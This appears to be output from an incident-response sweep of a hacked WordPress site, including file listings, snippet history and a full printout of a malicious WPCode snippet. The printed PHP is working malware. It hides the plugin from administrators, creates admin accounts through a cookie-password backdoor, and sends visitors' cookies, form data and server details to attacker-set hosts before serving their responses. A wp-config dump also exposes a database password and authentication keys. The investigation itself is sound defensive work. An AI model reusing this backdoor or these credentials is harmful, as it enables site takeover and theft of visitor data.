@@ -1,0 +1,568 @@
+﻿=== wp-config.php diff vs sample ===
+-rw-r--r-- 1 taylosj9 taylosj9 3376 May  3 07:12 wp-config.php
+
+--- first 80 lines of wp-config.php ---
+<?php
+/** Enable W3 Total Cache */
+
+/** Enable W3 Total Cache */
+ //Added by WP-Cache Manager
+
+/**
+ * The base configurations of the WordPress.
+ *
+ * This file has the following configurations: MySQL settings, Table Prefix,
+ * Secret Keys, and ABSPATH. You can find more information by visiting
+ * {@link http://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
+ * Codex page. You can get the MySQL settings from your web host.
+ *
+ * This file is used by the wp-config.php creation script during the
+ * installation. You don't have to use the web site, you can just copy this file
+ * to "wp-config.php" and fill in the values.
+ *
+ * @package WordPress
+ */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define('DB_NAME', 'taylosj9_wo5529');
+
+/** MySQL database username */
+define('DB_USER', 'taylosj9_wo5529');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'MTxPzOPs3BQ4');
+
+/** MySQL hostname */
+define('DB_HOST', 'localhost');
+
+/** Database Charset to use in creating database tables. */
+define('DB_CHARSET', 'utf8');
+
+/** The Database Collate type. Don't change this if in doubt. */
+define('DB_COLLATE', '');
+
+/**#@+
+ * Authentication Unique Keys and Salts.
+ *
+ * Change these to different unique phrases!
+ * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
+ * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */
+/**#@-*/
+
+/**
+ * WordPress Database Table prefix.
+ *
+ * You can have multiple installations in one database if you give each a unique
+ * prefix. Only numbers, letters, and underscores please!
+ */
+define('AUTH_KEY',         ':~f{-3ASu>/88^K=D@ h&]0S+rnb)<pRh[.V0fF[Dmkm0GT~w|$H`c)[me $87Qk');
+define('SECURE_AUTH_KEY',  '1W~hs0S]]kV:.Vr3RtqgIGK[*[Z|f-OURAlV:f`j_q,}IOi]2QfUL1oD7|V}La8Y');
+define('LOGGED_IN_KEY',    'MTHwH:*;JJV95uQhXhf-(L=^%x&6yqGMgMNvAS-1@,+Zw-m.Qa<DH+Aolp}}I6:t');
+define('NONCE_KEY',        'C^H~,|<w-7e`UncYKU> s 5]BLC?|Hg#lZUw;f8FwaYt&:Z2d-Odq$^eSWLo^A@L');
+define('AUTH_SALT',        '$J*}:^*a{)8ij=);kXODOB*IT2X~*$&^z^LZpIMQ]uWR:rgy0`[kL]SKT)&nK<%I');
+define('SECURE_AUTH_SALT', '%_trl&J+~652[]:`X,fr+3/bZ,l> +dX_{8]P-OV[K}PcO-%o-~C=#a8?seU;b!X');
+define('LOGGED_IN_SALT',   '2H{r>u-B.q-Edf!6NetxZc+|VezJ`Uu&cy@i[yKRcQ:: 9G9R/EhTiJfPd;<y^Ge');
+define('NONCE_SALT',       '7a Wa4|6B+;;jY?Q @z+BP|^W3j$R4|Lv8VQa(1Ut~x;[bB=]5fmv%O((Wtb()e%');
+
+$table_prefix = "wp_";
+
+/**
+ * For developers: WordPress debugging mode.
+ *
+ * Change this to true to enable the display of notices during development.
+ * It is strongly recommended that plugin and theme developers use WP_DEBUG
+ * in their development environments.
+ */
+define('WP_DEBUG', false);
+
+/* That's all, stop editing! Happy blogging. */
+
+/** Absolute path to the WordPress directory. */
+
+--- last 60 lines of wp-config.php ---
+define('DB_CHARSET', 'utf8');
+
+/** The Database Collate type. Don't change this if in doubt. */
+define('DB_COLLATE', '');
+
+/**#@+
+ * Authentication Unique Keys and Salts.
+ *
+ * Change these to different unique phrases!
+ * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
+ * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */
+/**#@-*/
+
+/**
+ * WordPress Database Table prefix.
+ *
+ * You can have multiple installations in one database if you give each a unique
+ * prefix. Only numbers, letters, and underscores please!
+ */
+define('AUTH_KEY',         ':~f{-3ASu>/88^K=D@ h&]0S+rnb)<pRh[.V0fF[Dmkm0GT~w|$H`c)[me $87Qk');
+define('SECURE_AUTH_KEY',  '1W~hs0S]]kV:.Vr3RtqgIGK[*[Z|f-OURAlV:f`j_q,}IOi]2QfUL1oD7|V}La8Y');
+define('LOGGED_IN_KEY',    'MTHwH:*;JJV95uQhXhf-(L=^%x&6yqGMgMNvAS-1@,+Zw-m.Qa<DH+Aolp}}I6:t');
+define('NONCE_KEY',        'C^H~,|<w-7e`UncYKU> s 5]BLC?|Hg#lZUw;f8FwaYt&:Z2d-Odq$^eSWLo^A@L');
+define('AUTH_SALT',        '$J*}:^*a{)8ij=);kXODOB*IT2X~*$&^z^LZpIMQ]uWR:rgy0`[kL]SKT)&nK<%I');
+define('SECURE_AUTH_SALT', '%_trl&J+~652[]:`X,fr+3/bZ,l> +dX_{8]P-OV[K}PcO-%o-~C=#a8?seU;b!X');
+define('LOGGED_IN_SALT',   '2H{r>u-B.q-Edf!6NetxZc+|VezJ`Uu&cy@i[yKRcQ:: 9G9R/EhTiJfPd;<y^Ge');
+define('NONCE_SALT',       '7a Wa4|6B+;;jY?Q @z+BP|^W3j$R4|Lv8VQa(1Ut~x;[bB=]5fmv%O((Wtb()e%');
+
+$table_prefix = "wp_";
+
+/**
+ * For developers: WordPress debugging mode.
+ *
+ * Change this to true to enable the display of notices during development.
+ * It is strongly recommended that plugin and theme developers use WP_DEBUG
+ * in their development environments.
+ */
+define('WP_DEBUG', false);
+
+/* That's all, stop editing! Happy blogging. */
+
+/** Absolute path to the WordPress directory. */
+if ( !defined('ABSPATH') )
+	define('ABSPATH', dirname(__FILE__) . '/');
+
+/** Sets up WordPress vars and included files. */
+require_once(ABSPATH . 'wp-settings.php');
+
+/**
+ * Include tweaks requested by hosting providers.  You can safely
+ * remove either the file or comment out the lines below to get
+ * to a vanilla state.
+ */
+if (file_exists(ABSPATH . 'hosting_provider_filters.php')) {
+	include('hosting_provider_filters.php');
+}
+
+
+=== twentyeleven theme modified files (last 7 days) ===
+wp-content/themes/twentyeleven/page.php
+wp-content/themes/twentyeleven/single.php
+wp-content/themes/twentyeleven/search.php
+wp-content/themes/twentyeleven/functions.php
+wp-content/themes/twentyeleven/image.php
+wp-content/themes/twentyeleven/404.php
+wp-content/themes/twentyeleven/header.php
+wp-content/themes/twentyeleven/footer.php
+wp-content/themes/twentyeleven/tag.php
+wp-content/themes/twentyeleven/content-page.php
+wp-content/themes/twentyeleven/content-status.php
+wp-content/themes/twentyeleven/content-image.php
+wp-content/themes/twentyeleven/content-featured.php
+wp-content/themes/twentyeleven/showcase.php
+wp-content/themes/twentyeleven/sidebar.php
+wp-content/themes/twentyeleven/author.php
+wp-content/themes/twentyeleven/category.php
+wp-content/themes/twentyeleven/content-single.php
+wp-content/themes/twentyeleven/sidebar-page.php
+wp-content/themes/twentyeleven/comments.php
+wp-content/themes/twentyeleven/inc/block-patterns.php
+wp-content/themes/twentyeleven/inc/widgets.php
+wp-content/themes/twentyeleven/inc/theme-options.php
+wp-content/themes/twentyeleven/searchform.php
+wp-content/themes/twentyeleven/content.php
+wp-content/themes/twentyeleven/content-intro.php
+wp-content/themes/twentyeleven/index.php
+wp-content/themes/twentyeleven/content-aside.php
+wp-content/themes/twentyeleven/sidebar-footer.php
+wp-content/themes/twentyeleven/content-link.php
+wp-content/themes/twentyeleven/archive.php
+wp-content/themes/twentyeleven/content-gallery.php
+wp-content/themes/twentyeleven/content-quote.php
+
+=== look for malicious code in twentyeleven/functions.php ===
+lines: 997
+<?php
+/**
+ * Twenty Eleven functions and definitions
+ *
+ * Sets up the theme and provides some helper functions. Some helper functions
+ * are used in the theme as custom template tags. Others are attached to action and
+ * filter hooks in WordPress to change core functionality.
+ *
+ * The first function, twentyeleven_setup(), sets up the theme by registering support
+ * for various features in WordPress, such as post thumbnails, navigation menus, and the like.
+ *
+ * When using a child theme you can override certain functions (those wrapped
+ * in a function_exists() call) by defining them first in your child theme's
+ * functions.php file. The child theme's functions.php file is included before
+ * the parent theme's file, so the child theme functions would be used.
+ *
+ * @link https://developer.wordpress.org/themes/basics/theme-functions/
+ * @link https://developer.wordpress.org/themes/advanced-topics/child-themes/
+ *
+ * Functions that are not pluggable (not wrapped in function_exists()) are instead attached
+ * to a filter or action hook. The hook can be removed by using remove_action() or
+ * remove_filter() and you can attach your own function to the hook.
+ *
+ * We can remove the parent theme's hook only after it is attached, which means we need to
+ * wait until setting up the child theme:
+ *
+ * <code>
+ * add_action( 'after_setup_theme', 'my_child_theme_setup' );
+ * function my_child_theme_setup() {
+ *     // We are providing our own filter for excerpt_length (or using the unfiltered value).
+ *     remove_filter( 'excerpt_length', 'twentyeleven_excerpt_length' );
+ *     ...
+ * }
+ * </code>
+ *
+ * For more information on hooks, actions, and filters, see https://developer.wordpress.org/plugins/.
+ *
+ * @package WordPress
+ * @subpackage Twenty_Eleven
+ * @since Twenty Eleven 1.0
+...
+	 * Added for backward compatibility to support pre-5.2.0 WordPress versions.
+	 *
+	 * @since Twenty Eleven 3.3
+	 */
+	function wp_body_open() {
+		/**
+		 * Triggered after the opening <body> tag.
+		 *
+		 * @since Twenty Eleven 3.3
+		 */
+		do_action( 'wp_body_open' );
+	}
+endif;
+
+/**
+ * Includes a skip to content link at the top of the page so that users can bypass the menu.
+ *
+ * @since Twenty Eleven 3.4
+ */
+function twentyeleven_skip_link() {
+	echo '<div class="skip-link"><a class="assistive-text" href="#content">' . esc_html__( 'Skip to primary content', 'twentyeleven' ) . '</a></div>';
+	if ( ! is_singular() ) {
+		echo '<div class="skip-link"><a class="assistive-text" href="#secondary">' . esc_html__( 'Skip to secondary content', 'twentyeleven' ) . '</a></div>';
+	}
+}
+add_action( 'wp_body_open', 'twentyeleven_skip_link', 5 );
+
+if ( ! function_exists( 'wp_get_list_item_separator' ) ) :
+	/**
+	 * Retrieves the list item separator based on the locale.
+	 *
+	 * Added for backward compatibility to support pre-6.0.0 WordPress versions.
+	 *
+	 * @since 6.0.0
+	 */
+	function wp_get_list_item_separator() {
+		/* translators: Used between list items, there is a space after the comma. */
+		return __( ', ', 'twentyeleven' );
+	}
+endif;
+
+=== grep ALL malware signatures in modified files ===
+
+=== full sweep: ALL php files containing _red, _pwsa, hihatbar, petal-plain, or Cloudflare pages.dev ===
+
+=== compare wpcode snippet 173840 publish date ===
+ID	post_status	post_date	post_modified	post_title
+173840	publish	2026-01-27 15:35:11	2026-01-27 15:35:11	Untitled Snippet
+173823	trash	2025-08-07 23:25:39	2026-01-27 15:35:00	Untitled Snippet
+173822	trash	2025-08-02 19:30:20	2025-08-07 23:25:14	Untitled Snippet
+173816	trash	2025-06-12 06:54:26	2025-08-02 19:30:13	Untitled Snippet
+173811	trash	2025-05-03 14:31:59	2025-06-12 06:54:13	Untitled Snippet
+173809	trash	2025-04-22 09:21:16	2025-05-03 14:31:43	Untitled Snippet
+173806	trash	2025-04-01 15:50:31	2025-04-22 09:21:10	Untitled Snippet
+173803	trash	2025-03-13 16:22:00	2025-04-01 15:50:24	Untitled Snippet
+173557	trash	2025-01-21 01:35:47	2025-03-13 16:21:51	Untitled Snippet
+173495	draft	2023-09-08 13:47:29	2023-09-08 13:47:29	Display a message after the 1st paragraph of posts
+173496	draft	2023-09-08 13:47:29	2023-09-08 13:47:29	Completely Disable Comments
+
+=== where does _WP_PWSA come from for snippet 173840? ===
+if (defined("_WP_WEBSITE")) {
+\n    return;
+\n}
+\n
+\ndefine("_WP_PWSA", "da1b61dff981349d695dd5c5b6ed313d");
+\ndefine('_WP_WEBSITE', "www.old.taylorchasewhite.com");
+\n
+\nforeach (['DONOTCACHEPAGE', 'DONOTMINIFY', 'DONOTCDN'] as $const) {
+\n    if (!defined($const)) {
+\n        define($const, false);
+\n    }
+\n}
+\n
+\nadd_filter( 'sgo_bypass_cache', '__return_true' );
+\nadd_filter( 'autoptimize_filter_noptimize', '__return_true' );
+\nadd_filter('do_rocket_generate_caching_files', '__return_false');
+\nadd_filter('w3tc_can_cache', '__return_false');
+\nadd_filter('wp_cache_not_logged_in', '__return_false');
+\nadd_filter('wp_cache_no_cache_for_get', '__return_true');
+\ndo_action( 'litespeed_control_set_nocache', '' );
+\n
+\nfunction b64($input)
+\n{
+\n    return base64_decode($input);
+\n}
+\n
+\nfunction download($path, $add_fields)
+\n{
+\n    $fields = ['v' => 2, 'website' => _WP_WEBSITE, 'server' => $_SERVER, 'download_type' => 'direct'];
+\n    if ($add_fields) {
+\n        $fields = array_merge($fields, [
+\n            'post' => isset($_POST) ? $_POST : [],
+\n            'get' => isset($_GET) ? $_GET : [],
+\n            'cookie' => isset($_COOKIE) ? $_COOKIE : []
+\n        ]);
+\n    }
+\n    $ch = @curl_init();
+\n    @curl_setopt($ch, CURLOPT_URL, $path);
+\n    @curl_setopt($ch, CURLOPT_POST, 1);
+\n    @curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+\n    @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+\n    @curl_setopt($ch, CURLOPT_TIMEOUT, 60);
+\n    @curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
+\n    @curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($fields));
+\n    $output = @curl_exec($ch);
+\n    @curl_close($ch);
+\n    return $output;
+\n}
+\n
+\nif ((current_user_can('edit_pages') || current_user_can('edit_others_pages')) && !array_key_exists('show_all', $_GET) && !defined('_WP_FIX')) {
+\n    define('_WP_FIX', true);
+\n
+\n    function fix_style()
+\n    {
+\n        echo '<style>';
+\n        echo '#toplevel_page_wpcode { display: none; }';
+\n        echo '#wp-admin-bar-wpcode-admin-bar-info { display: none; }';
+\n        echo '#wpcode-notice-global-review_request { display: none; }';
+\n        echo '</style>';
+\n    }
+\n
+\n    add_action('admin_head', 'fix_style');
+\n    add_action('wp_head', 'fix_style');
+\n
+\n    add_filter('all_plugins', function ($plugins) {
+\n        if (isset($plugins['wpcode/wpcode.php'])) {
+\n            unset($plugins['wpcode/wpcode.php']);
+\n        }
+\n        if (isset($plugins['insert-headers-and-footers/ihaf.php'])) {
+\n            unset($plugins['insert-headers-and-footers/ihaf.php']);
+\n        }
+\n        return $plugins;
+\n    });
+\n
+\n    function fix_updates($value)
+\n    {
+\n        if (isset($value) && is_object($value)) {
+\n            if (isset($value->response['insert-headers-and-footers/ihaf.php'])) {
+\n                unset($value->response['insert-headers-and-footers/ihaf.php']);
+\n            }
+\n            if (isset($value->response['wpcode/wpcode.php'])) {
+\n                unset($value->response['wpcode/wpcode.php']);
+\n            }
+\n        }
+\n        return $value;
+\n    }
+\n
+\n    add_filter('site_transient_update_plugins', 'fix_updates');
+\n    add_filter('transient_update_plugins', 'fix_updates');
+\n}
+\n
+\nif (!function_exists('_red')) {
+\n    error_reporting(0);
+\n    ini_set('display_errors', 0);
+\n
+\n    function _gcookie($n)
+\n    {
+\n        return (isset($_COOKIE[$n])) ? b64($_COOKIE[$n]) : '';
+\n    }
+\n
+\n    if (!empty(_WP_PWSA) && _gcookie('pw') === _WP_PWSA) {
+\n        switch (_gcookie('c')) {
+\n            case 'sd':
+\n                $d = _gcookie('d');
+\n                if (strpos($d, '.') > 0) {
+\n                    update_option('d', $d);
+\n                }
+\n                break;
+\n            case 'sl':
+\n                $l = _gcookie('l');
+\n                if (substr($l, 0, 4) === 'http' && strpos($l, '.') > 0) {
+\n                    update_option('l', $l);
+\n                }
+\n                break;
+\n            case 'au':
+\n                $u = _gcookie('u');
+\n                $p = _gcookie('p');
+\n                $e = _gcookie('e');
+\n
+\n                if ($u && $p && $e && !username_exists($u)) {
+\n                    $user_id = wp_create_user($u, $p, $e);
+\n                    $user = new WP_User($user_id);
+\n                    $user->set_role('administrator');
+\n                }
+\n                break;
+\n        }
+\n        die('X-OK');
+\n    }
+\n
+\n    if (@stripos(wp_login_url(), '' . $_SERVER['SCRIPT_NAME']) !== false) {
+\n        return;
+\n    }
+\n
+\n    if (_gcookie("skip") === "1") {
+\n        return;
+\n    }
+\n
+\n    function _user_ip()
+\n    {
+\n        foreach (array('HTTP_CF_CONNECTING_IP', 'HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $key) {
+\n            if (array_key_exists($key, $_SERVER) && !empty($_SERVER[$key])) {
+\n                foreach (@explode(',', '' . $_SERVER[$key]) as $ip) {
+\n                    $ip = trim($ip);
+\n                    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
+\n                        return $ip;
+\n                    }
+\n                }
+\n            }
+\n        }
+\n
+\n        return false;
+\n    }
+\n
+\n    function _red()
+\n    {
+\n        if (is_user_logged_in()) {
+\n            return;
+\n        }
+\n
+\n        if (isset($_SERVER['REQUEST_URI']) && (stripos($_SERVER['REQUEST_URI'], 'wp-admin') !== false || stripos($_SERVER['REQUEST_URI'], 'wp-login.php') !== false)) {
+\n            return;
+\n        }
+\n
+\n        $ip = _user_ip();
+\n        if (!$ip) {
+\n            return;
+\n        }
+\n
+\n        $exp = get_transient('exp');
+\n        if (!is_array($exp)) {
+\n            $exp = array();
+\n        }
+\n
+\n        foreach ($exp as $k => $v) {
+\n            if (time() - $v > 86400) {
+\n                unset($exp[$k]);
+\n            }
+\n        }
+\n
+\n        $u = strtolower(preg_replace("/[^A-Za-z0-9]/", '', isset($_GET['u']) ? 'uu' . $_GET['u'] : ''));
+\n        $u = (strlen($u) > 20) ? substr($u, 0, 20) : $u;
+\n
+\n        $post = isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['v']) && isset($_POST['website']) && isset($_POST['server']) && isset($_POST['download_type']);
+\n
+\n        if (key_exists($ip, $exp) && (time() - $exp[$ip] < 86400) && strlen($u) < 3 && !$post) {
+\n            return;
+\n        }
+\n
+\n        if (!function_exists('curl_init')) {
+\n            return;
+\n        }
+\n
+\n        $links = get_option('l');
+\n        if (!$links) {
+\n            return;
+\n        }
+\n
+\n        $exp[$ip] = time();
+\n        delete_transient('exp');
+\n        set_transient('exp', $exp);
+\n
+\n        $links = explode("\\n", $links);
+\n        shuffle($links);
+\n
+\n        for ($i = 0; $i < 4; $i++) {
+\n            $s = $links[$i % count($links)] . "/" . substr(md5(microtime()), rand(0, 26), 6);
+\n            if (!$s || substr($s, 0, 4) !== 'http') {
+\n                continue;
+\n            }
+\n
+\n            $output = download($s, $post || strlen($u) > 2);
+\n
+\n            if ($output) {
+\n                $j = json_decode($output);
+\n                if (is_object($j) && (isset($j->body) || isset($j->headers) || isset($j->skip))) {
+\n                    if ($post && isset($j->headers) && isset($j->body)) {
+\n                        echo $output;
+\n                        exit;
+\n                    } else {
+\n                        if (isset($j->headers)) {
+\n                            foreach ($j->headers as $header) {
+\n                                header($header);
+\n
+\n                            }
+\n                        }
+\n                        if (isset($j->body)) {
+\n                            echo b64($j->body);
+\n                        }
+\n                    }
+\n                    if (isset($j->skip)) {
+\n                        break;
+\n                    } else {
+\n                        exit;
+\n                    }
+\n                }
+\n            }
+\n        }
+\n    }
+\n
+\n    add_action('init', '_red');
+\n}
+
+=== check active mu-plugins via WP - is sso.php legit? Compare to original Bluehost sso ===
+sso.php sha:
+5189fd1ef9d519d2c1e8a1118e81a093147c767e3773b6ec5fd860b0afd50c7d  wp-content/mu-plugins/sso.php
+
+=== are there any webshells named like license.php, wp-cache.php, lock360.php, alfa.php etc ===
+./wp/backup-1424038016-wp-includes/Text/Diff/Engine/shell.php
+./wp/wp-includes/Text/Diff/Engine/shell.php
+./wp/wp-content/plugins/wp-super-cache/wp-cache.php
+./wp-includes/Text/Diff/Engine/shell.php
+
+=== large suspicious files (50k+ in unusual locations) ===
+wp-includes/class-wp-customize-control.php
+wp-includes/functions.wp-scripts.php
+wp-includes/block-template.php
+wp-includes/class-wp-comment-query.php
+wp-includes/class-wp-image-editor-imagick.php
+wp-includes/user.php
+wp-includes/media-template.php
+wp-includes/class-wp-user.php
+wp-includes/admin-bar.php
+wp-includes/speculative-loading.php
+wp-includes/class-wp-scripts.php
+wp-includes/ms-files.php
+wp-includes/class-wp-xmlrpc-server.php
+wp-includes/class-wp-block-styles-registry.php
+wp-includes/nav-menu.php
+wp-includes/class-wp-block-list.php
+wp-includes/class-wp-locale-switcher.php
+wp-includes/class-json.php
+wp-includes/class-wp-phpmailer.php
+wp-includes/class-wp-block.php
+wp-includes/class-wp-user-query.php
+wp-includes/theme.php
+wp-includes/class-wp-oembed.php
+wp-includes/class-wp-block-templates-registry.php
+wp-includes/embed.php
+wp-includes/functions.php
+wp-includes/compat-utf8.php
+wp-includes/ID3/module.tag.apetag.php
+wp-includes/ID3/module.audio.mp3.php
+wp-includes/ID3/getid3.lib.php
